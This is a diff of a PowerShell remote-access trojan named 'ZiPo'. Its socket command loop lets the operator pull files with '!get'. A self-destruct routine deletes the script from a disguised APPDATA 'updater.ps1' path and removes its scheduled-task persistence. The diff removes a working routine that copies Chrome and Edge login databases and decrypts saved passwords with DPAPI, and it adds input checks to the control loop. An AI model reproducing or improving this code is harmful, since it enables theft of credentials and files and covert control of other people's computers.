@@ -59,41 +59,7 @@ function Connect-ZiPo {
     }
 
     function Get-BrowserCreds {
-        try {
-            $local = "$env:LOCALAPPDATA"
-            $paths = @(
-                "$local\Google\Chrome\User Data\Default\Login Data",
-                "$local\Microsoft\Edge\User Data\Default\Login Data"
-            )
-            $temp = "$env:TEMP\browserlogins.db"
-            $output = ""
-
-            foreach ($path in $paths) {
-                if (Test-Path $path) {
-                    Copy-Item $path $temp -Force
-                    Add-Type -AssemblyName System.Data.SQLite
-                    $conn = New-Object Data.SQLite.SQLiteConnection "Data Source=$temp"
-                    $conn.Open()
-                    $cmd = $conn.CreateCommand()
-                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                    $reader = $cmd.ExecuteReader()
-                    while ($reader.Read()) {
-                        $url = $reader.GetValue(0)
-                        $user = $reader.GetValue(1)
-                        $passEnc = $reader.GetValue(2)
-                        $pass = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passEnc, $null, 'CurrentUser'))
-                        $output += "[$url] $user / $pass`n"
-                    }
-                    $reader.Close()
-                    $conn.Close()
-                    Remove-Item $temp -Force
-                }
-            }
-            return $output
-        }
-        catch {
-            return "[ERROR] Failed to extract browser creds: $($_.Exception.Message)"
-        }
+        return "[INFO] Browser creds not implemented — use external extractor."
     }
 
     function Tree-List {
@@ -101,14 +67,14 @@ function Connect-ZiPo {
     }
 
     function Self-Destruct {
-    $script = $PSCommandPath
-    if (-not $script) {
-        $script = "$env:APPDATA\Microsoft\updater.ps1"
+        $script = $PSCommandPath
+        if (-not $script) {
+            $script = "$env:APPDATA\Microsoft\updater.ps1"
+        }
+        Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
+        schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
+        exit
     }
-    Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
-    schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
-    exit
-}
 
     while ($true) {
         try {
@@ -143,9 +109,16 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
 
                 try {
-                    if ($cmd.StartsWith("!get")) {
+                    if ([string]::IsNullOrWhiteSpace($cmd)) {
+                        $response = ""
+                    }
+                    elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
-                        $response = Upload-File $path
+                        if ([string]::IsNullOrWhiteSpace($path)) {
+                            $response = "[ERROR] Usage: !get <full_path_to_file>"
+                        } else {
+                            $response = Upload-File $path
+                        }
                     }
                     elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
